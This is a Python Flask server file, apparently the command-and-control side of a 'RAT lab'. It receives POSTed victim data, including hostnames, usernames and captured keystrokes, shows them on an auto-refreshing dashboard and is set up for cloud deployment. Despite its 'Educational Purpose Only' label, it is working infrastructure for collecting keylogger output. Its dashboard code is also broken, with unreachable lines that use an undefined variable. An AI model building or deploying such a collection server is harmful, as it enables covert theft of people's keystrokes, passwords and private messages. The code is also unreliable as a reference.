from flask import Flask, request, jsonify
from flask_cors import CORS
import json
from datetime import datetime
import os  # IMPORTANT!

app = Flask(__name__)
CORS(app)

data_store = []

@app.route('/')
def home():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Cyber Lab - LIVE</title>
        <style>
            body { font-family: Arial; margin: 40px; background: #f5f5f5; }
            .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
            h1 { color: #333; border-bottom: 3px solid #4CAF50; padding-bottom: 10px; }
            .data-box { background: #f8f9fa; border-left: 4px solid #4CAF50; padding: 15px; margin: 15px 0; }
            .keystrokes { background: #fffde7; padding: 10px; border: 1px dashed #ffd600; margin: 10px 0; font-family: monospace; }
        </style>
        <meta http-equiv="refresh" content="3">
    </head>
    <body>
        <div class="container">
            <h1>🔐 Cybersecurity RAT Lab</h1>
            <p><em>Educational Purpose Only</em></p>
            <hr>
            <h2>📊 Collected Data</h2>
    """
    
    if not data_store:
        html += "<p>No data received yet. Start your client to send data.</p>"
    else:
        for item in reversed(data_store[-5:]):
            html += f"""
            <div class="data-box">
                <div>💻 <strong>{item.get('victim', 'Unknown')}</strong></div>
                <div>🖥️ {item.get('system', 'Unknown')} | 👤 {item.get('user', 'Unknown')}</div>
                <div class="keystrokes">⌨️ {item.get('keystrokes', 'None')}</div>
                <div style="color: #666; font-size: 0.9em;">🕒 {item.get('timestamp', 'Unknown')}</div>
            </div>
            """
    
    html += f"""
            <hr>
            <p><strong>Total entries:</strong> {len(data_store)}</p>
            <p><a href="/test">Test</a> | <a href="/clear">Clear</a></p>
        </div>
    </body>
    </html>
    """
    return html

@app.route('/log', methods=['POST'])
def log_data():
    data = request.json
    data['received_at'] = datetime.now().isoformat()
    data_store.append(data)
    
    return jsonify({
        "status": "success",
        "message": f"Data received from {data.get('victim', 'Unknown')}",
        "total": len(data_store)
    })

@app.route('/test')
def test():
    return jsonify({
        "status": "online",
        "service": "Cyber Lab Server",
        "timestamp": datetime.now().isoformat(),
        "port": os.environ.get("PORT", "5000")
    })

@app.route('/clear')
def clear():
    data_store.clear()
    return "Data cleared"

# ==== CRITICAL PART FOR RAILWAY ====
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 Starting server on port {port}...")
    print(f"📡 POST to: /log")
    print(f"🌐 Dashboard: /")
    app.run(host='0.0.0.0', port=port, debug=False)
